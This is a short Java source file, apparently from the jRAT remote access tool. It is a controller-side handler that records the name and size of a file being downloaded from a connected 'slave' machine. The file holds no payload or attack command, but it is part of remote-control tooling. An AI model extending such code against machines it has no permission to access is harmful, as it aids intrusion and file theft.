package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.controller.Slave;


public class Packet30BeginServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		long length = dis.readLong();
		
		TransferData data = FileCache.get(file);

		if (data != null) {
			data.setRemoteFile(file);
			data.setTotal(length);
			data.setObject(slave);
		}
	}

}
